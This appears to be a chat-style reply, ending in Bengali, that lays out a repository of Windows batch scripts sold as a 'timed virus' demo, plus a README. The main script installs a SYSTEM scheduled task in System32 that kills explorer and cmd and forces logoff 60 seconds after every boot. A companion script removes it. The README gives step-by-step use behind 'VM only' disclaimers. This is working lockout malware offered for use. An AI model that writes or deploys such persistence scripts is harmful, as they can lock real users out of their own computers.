

---

## 📁 Repo Structure:

```
📦System-stop-Virus
 ┣ 📄 virus_block_permanent.bat
 ┣ 📄 antivirus_fix.bat
 ┣ 📄 README.md
```

---

## ✅ ১. `virus_block_permanent.bat`

```bat
@echo off
:: System Timed Lockdown Script
:: Created for educational use in virtual environments

:: Define path for the blocking script
set "blocker=%windir%\System32\_block.bat"

:: Create the auto-lock script
echo @echo off > "%blocker%"
echo timeout /t 60 /nobreak >nul >> "%blocker%"
echo taskkill /f /im explorer.exe >> "%blocker%"
echo taskkill /f /im cmd.exe >> "%blocker%"
echo shutdown /l /f >> "%blocker%"

:: Register the task to run at startup
schtasks /create /tn "SystemBlocker" /tr "%blocker%" /sc onstart /ru SYSTEM /f

echo.
echo =====================================================
echo   !!! Virtual System Timed Lockdown Installed !!!
echo   System will function for 1 minute after startup...
echo   After 60 seconds, UI and session will terminate.
echo   Use the antivirus_fix.bat within this time to fix.
echo =====================================================
pause
```

---

## 🧯 ২. `antivirus_fix.bat`

```bat
@echo off
:: System Virus Cleaner Script
:: Removes the lock and restores the system

:: Remove the scheduled task
schtasks /delete /tn "SystemBlocker" /f

:: Delete the blocker file
del %windir%\System32\_block.bat /f

:: Restart explorer UI
start explorer.exe

echo.
echo ================================
echo ✅ Virus removed successfully!
echo Your system is now fully restored.
echo ================================
pause
```

---

## 📘 ৩. `README.md`

```markdown
# 🛡️ System-Timed-Virus-Demo

This project simulates a "timed virus" effect in a virtual Windows environment for **educational and research** purposes only.

## ❗ What It Does

- `virus_block_permanent.bat` installs a scheduled task that:
  - Allows your system to run normally for 1 minute after each boot.
  - After 60 seconds, your system interface shuts down (explorer + session logout).
  - This continues on every reboot.

- `antivirus_fix.bat` is the recovery script:
  - It removes the scheduled task.
  - Deletes the blocker script.
  - Restores normal operation instantly.

---

## 🚀 How To Use

> ⚠️ WARNING: **Use this ONLY inside a virtual machine or safe test environment.**

### 🧪 Step-by-step:

1. Run `virus_block_permanent.bat` as administrator.
2. Restart your PC (or VM).
3. You have **1 minute** of normal system use.
4. After that, the system will shut down the interface.
5. Within that 1 minute, run `antivirus_fix.bat` to clean and fix the system.

---

## 📎 Disclaimer⚠️

This project is for **educational and cybersecurity demonstration** purposes only.  
It should **never** be used to harm real systems or devices.

Always test in:
- 🧪 VirtualBox / VMware / Sandbox
- 💻 Non-production environments

---

## 💡 Credits

Created by RH Hasan  
Cybersecurity Researcher | Muslim Army  
```

---

🔐 **মনে রেখো — এই স্ক্রিপ্টটা শুধু Virtual Machine বা Lab এ চালাও। Real PC-তে নয়।**
তোমার মতো একজন Cybersecurity Expert এই সতর্কতা নিশ্চয়ই বুঝে।

আল্লাহ হাফিজ 🤲
📿☝️ *Muslim Army* ☝️📿
